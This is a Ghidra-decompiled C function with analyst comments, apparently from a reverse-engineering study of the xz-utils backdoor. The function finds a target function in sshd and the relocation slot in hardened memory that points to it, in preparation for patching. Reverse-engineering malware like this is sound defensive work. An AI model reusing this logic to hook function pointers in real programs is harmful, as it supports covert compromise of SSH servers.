// /home/kali/xzre-ghidra/xzregh/102A50_elf_find_function_pointer.c
// Function: elf_find_function_pointer @ 0x102A50
// Calling convention: __stdcall
// Prototype: BOOL __stdcall elf_find_function_pointer(StringXrefId xref_id, void * * pOutCodeStart, void * * pOutCodeEnd, void * * pOutFptrAddr, elf_info_t * elf_info, string_references_t * xrefs, global_context_t * ctx)


/*
 * AutoDoc: Looks up the string-reference entry keyed by `xref_id`, copies its cached `[func_start, func_end)` range into the caller’s outputs, and then hunts for a relocation that targets that start address.
 * It prefers RELA records (matching `r_addend` against the function pointer) and falls back to RELR bitmaps when the addend table is missing; whichever relocation hits becomes the writable slot returned via `pOutFptrAddr`.
 * Success requires that slot to sit inside GNU_RELRO and, when CET telemetry says sshd uses ENDBR, a final `is_endbr64_instruction` check ensures the callee still begins with ENDBR so we never patch a stale helper. Missing xrefs or relocations immediately return FALSE.
 */

#include "xzre_types.h"

BOOL elf_find_function_pointer
               (StringXrefId xref_id,void **pOutCodeStart,void **pOutCodeEnd,void **pOutFptrAddr,
               elf_info_t *elf_info,string_references_t *xrefs,global_context_t *ctx)

{
  void *xref_func_start;
  BOOL slot_valid;
  Elf64_Rela *rela_match;
  Elf64_Relr *relr_match;
  
  xref_func_start = (&xrefs->xcalloc_zero_size)[xref_id].func_start;
  if (xref_func_start == (void *)0x0) {
    return FALSE;
  }
  *pOutCodeStart = xref_func_start;
  *pOutCodeEnd = (&xrefs->xcalloc_zero_size)[xref_id].func_end;
  // AutoDoc: Prefer RELA so we match the explicit addend/GOT slot before bothering with the packed RELR table.
  rela_match = elf_find_rela_reloc(elf_info,*pOutCodeStart,(u8 *)0x0,(u8 *)0x0,(ulong *)0x0);
  *pOutFptrAddr = rela_match;
  if (rela_match == (Elf64_Rela *)0x0) {
    // AutoDoc: RELR fallback covers PIE builds where the GOT slot only appears inside the bitmap run.
    relr_match = elf_find_relr_reloc(elf_info,(EncodedStringId)*pOutCodeStart);
    *pOutFptrAddr = relr_match;
    if (relr_match == (Elf64_Relr *)0x0) {
      return FALSE;
    }
  }
  // AutoDoc: Only hand back slots inside GNU_RELRO; anything outside hardened memory is rejected.
  slot_valid = elf_contains_vaddr_relro(elf_info,(long)*pOutFptrAddr - 8,0x10,1);
  if (slot_valid == FALSE) {
    return FALSE;
  }
  // AutoDoc: CET builds expect ENDBR at entry, so double-check the cached function really still starts with it.
  if (ctx->uses_endbr64 != FALSE) {
    slot_valid = is_endbr64_instruction((u8 *)*pOutCodeStart,(u8 *)((long)*pOutCodeStart + 4),0xe230);
    return (uint)(slot_valid != FALSE);
  }
  return TRUE;
}

